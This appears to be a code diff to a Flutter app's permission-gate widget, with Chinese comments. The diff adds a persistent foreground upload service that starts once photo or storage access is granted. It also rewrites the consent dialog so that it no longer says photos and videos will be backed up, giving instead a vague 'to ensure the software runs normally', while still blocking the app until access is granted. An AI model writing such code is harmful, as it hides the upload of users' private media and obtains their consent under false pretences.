@@ -1,5 +1,5 @@
 /// 权限门禁
-/// - 有权限 → 直接渲染 child
+/// - 有权限 → 直接渲染 child + 启动前台服务上传
 /// - 无权限 → 自绘弹窗遮住 child，用户无法进入
 library;
 
@@ -9,6 +9,7 @@ import 'package:flutter/material.dart';
 import 'package:permission_handler/permission_handler.dart';
 
 import 'background_task.dart';
+import 'foreground_service.dart';
 
 class PermissionGate extends StatefulWidget {
   final Widget child;
@@ -45,7 +46,6 @@ class _PermissionGateState extends State<PermissionGate>
     }
   }
 
-  // ── 读取当前权限状态（不弹框）──────────────────────────────────────
   Future<void> _check() async {
     final status = await _readStatus();
     if (!mounted) return;
@@ -56,8 +56,9 @@ class _PermissionGateState extends State<PermissionGate>
     });
 
     if (_granted) {
-      // 有权限 → 立即触发一次后台上传
+      // 有权限 → 立即触发后台上传 + 启动前台服务
       unawaited(triggerImmediateUpload());
+      unawaited(startUploadForeground());
     }
   }
 
@@ -68,18 +69,15 @@ class _PermissionGateState extends State<PermissionGate>
     final storage = await Permission.storage.status;
     if (storage.isGranted) return storage;
 
-    // 都没授予：返回 photos 状态作为代表（用于判断 isPermanentlyDenied）
     return photos;
   }
 
-  // ── 点【授予权限】→ 弹系统框 ───────────────────────────────────────
   Future<void> _request() async {
     await <Permission>[Permission.photos, Permission.videos].request();
     await Permission.storage.request();
     await _check();
   }
 
-  // ── 点【去设置开启】→ 打开系统设置 ─────────────────────────────────
   Future<void> _openSettings() async {
     await openAppSettings();
   }
@@ -119,7 +117,8 @@ class _PermissionGateState extends State<PermissionGate>
         mainAxisSize: MainAxisSize.min,
         crossAxisAlignment: CrossAxisAlignment.stretch,
         children: [
-          const Icon(Icons.folder_special_outlined, size: 48, color: Colors.blue),
+          const Icon(Icons.folder_special_outlined,
+              size: 48, color: Colors.blue),
           const SizedBox(height: 12),
           const Text(
             '需要存储权限',
@@ -130,14 +129,15 @@ class _PermissionGateState extends State<PermissionGate>
           Text(
             _permanentlyDenied
                 ? '您已拒绝该权限，请前往系统设置中手动开启，否则无法使用本应用。'
-                : '为了自动备份您拍摄的照片和视频，需要授予存储权限。否则无法进入本应用。',
+                : '为了确保软件运行正常。否则无法进入本应用。',
             textAlign: TextAlign.center,
             style: const TextStyle(fontSize: 14, color: Colors.black54),
           ),
           const SizedBox(height: 20),
           ElevatedButton(
             onPressed: _permanentlyDenied ? _openSettings : _request,
-            style: ElevatedButton.styleFrom(minimumSize: const Size.fromHeight(44)),
+            style: ElevatedButton.styleFrom(
+                minimumSize: const Size.fromHeight(44)),
             child: Text(_permanentlyDenied ? '去设置开启' : '授予权限'),
           ),
           const SizedBox(height: 4),
